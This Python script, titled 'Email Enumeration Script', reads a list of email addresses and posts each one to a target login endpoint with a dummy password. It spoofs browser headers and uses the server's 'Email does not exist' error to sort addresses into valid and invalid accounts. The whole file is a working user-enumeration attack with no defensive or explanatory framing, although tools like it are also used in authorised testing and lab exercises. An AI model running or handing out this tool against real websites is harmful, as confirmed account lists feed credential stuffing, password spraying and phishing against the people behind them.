import requests  # Used for sending HTTP requests
import sys  # Provides access to command-line arguments
import argparse  # Used for parsing command-line arguments

def check_email(email, url, headers):
    # Function to send a POST request with the provided email and parse the response
    data = {
        'username': email,  # The email to check
        'password': 'password',  # Placeholder password (can be changed)
        'function': 'login'
    }

    # Send the POST request and return the JSON response
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file, url, headers):
    # Function to read emails from a file and check their validity
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message indicating an invalid email (customize based on server response)

    with open(email_file, 'r') as file:
        emails = file.readlines()  # Read all emails from the file

    for email in emails:
        email = email.strip()  # Remove whitespace around each email
        if email:
            response_json = check_email(email, url, headers)  # Check the email using the API
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")  # Print invalid emails
            else:
                print(f"[VALID] {email}")  # Print valid emails
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Email Enumeration Script")
    parser.add_argument("email_file", help="Path to the file containing emails to check")
    parser.add_argument("--url", required=True, help="Target URL for the POST request")
    parser.add_argument("--host", required=True, help="Host header value")
    parser.add_argument("--referer", required=True, help="Referer header value")
    parser.add_argument("--origin", required=True, help="Origin header value")

    args = parser.parse_args()

    # Headers for the POST request
    headers = {
        'Host': args.host,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': args.origin,
        'Connection': 'close',
        'Referer': args.referer,
    }

    # Run the enumeration function
    valid_emails = enumerate_emails(args.email_file, args.url, headers)

    # Output the list of valid emails
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
